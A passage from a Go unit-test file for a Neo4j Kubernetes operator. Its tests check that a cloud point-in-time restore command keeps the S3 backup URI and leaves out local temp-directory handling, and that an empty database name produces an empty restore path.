	r := &Neo4jRestoreReconciler{}
	cmd, err := r.buildPITRRestoreCommand(context.Background(), restore, cluster)
	require.NoError(t, err)

	assert.Contains(t, cmd, "--from-path=s3://my-bucket/neo4j-backups/neo4j-2026-01-01.backup",
		"cloud PITR must pass the cloud URI unchanged")
	assert.NotContains(t, cmd, "$(ls",
		"cloud PITR must NOT use shell substitution")
	assert.NotContains(t, cmd, "rm -rf /tmp/restore-tmp",
		"cloud PITR must NOT include the local-tempdir prelude")
	// Note: cloud PITR doesn't default --temp-path either (the cloud
	// reader streams directly), so the absence here is intentional.
}

// TestBuildLocalRestoreFilePath_EmptyDatabaseNameSkips: a Neo4jRestore with
// empty spec.DatabaseName would produce a glob like `/-*.backup` which is
// meaningless. Validators catch empty DB names upstream, but if a future
// code path bypasses that, returning empty is the safe fallback —
// neo4j-admin will fail with a clearer error than a malformed glob.
func TestBuildLocalRestoreFilePath_EmptyDatabaseNameSkips(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "x",
				Storage:    &neo4jv1beta1.StorageLocation{Type: "pvc"},
			},
		},
	}
	got := buildLocalRestoreFilePath(restore, "/backup/x")
	assert.Empty(t, got, "empty dbname must skip shell-side resolution")
}
